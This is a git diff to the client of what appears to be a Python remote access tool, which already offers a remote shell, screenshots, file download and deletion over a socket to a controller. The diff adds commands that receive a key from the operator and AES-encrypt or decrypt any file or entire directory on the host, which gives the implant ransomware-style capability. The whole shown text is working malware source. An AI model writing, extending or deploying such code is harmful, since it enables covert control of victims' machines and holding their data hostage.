@@ -2,10 +2,11 @@
 from sys import argv
 from platform import system as find_system
 import os
+from os.path import isfile, isdir
 from subprocess import check_output, DEVNULL, PIPE, run, Popen
 from secure_socket import Client, HOSTNAME
-import pyscreenshot
 import ipaddress
+from aes_cbc_256 import AES_CBC_256
 
 class Computer:
   def shell(self, socket):
@@ -34,9 +35,14 @@ class Computer:
     os.chdir(origin)
 
   def screenshot(self,filename):
-    screenshot = pyscreenshot.grab()
     file_path = f'{os.getcwd()}/{filename}'
-    screenshot.save(file_path)
+    try:
+      import pyscreenshot
+      screenshot = pyscreenshot.grab()
+      screenshot.save(file_path)
+    except ModuleNotFoundError:
+      with open(file_path, 'w') as file:
+        file.write("ModuleNotFoundError: No module named 'pyscreenshot'")
     return file_path
 
 class Linux(Computer):
@@ -107,6 +113,28 @@ def download(socket):
   else:
     socket.send('File not found.')
 
+def encrypt(socket):
+  socket.send(HOSTNAME)
+  key=socket.receive(as_bytes=True)
+  aes=AES_CBC_256(key)
+  filename=socket.receive()
+  if isfile(filename):
+    aes.encrypt_file(filename)
+  elif isdir(filename):
+    aes.encrypt_dir(filename)
+  socket.send('done.')
+
+def decrypt(socket):
+  socket.send(HOSTNAME)
+  key=socket.receive(as_bytes=True)
+  aes=AES_CBC_256(key)
+  filename=socket.receive()
+  if isfile(filename):
+    aes.decrypt_file(filename)
+  elif isdir(filename):
+    aes.decrypt_dir(filename)
+  socket.send('done.')
+
 if __name__ == "__main__":
   host="127.0.0.1"
   try:
@@ -155,6 +183,10 @@ if __name__ == "__main__":
         os.remove(cleaned_filename)
       case "delete":
         using=False
+      case "encrypt":
+        encrypt(socket)
+      case "decrypt":
+        decrypt(socket)
       case _:
         pass
   socket.disconnect()
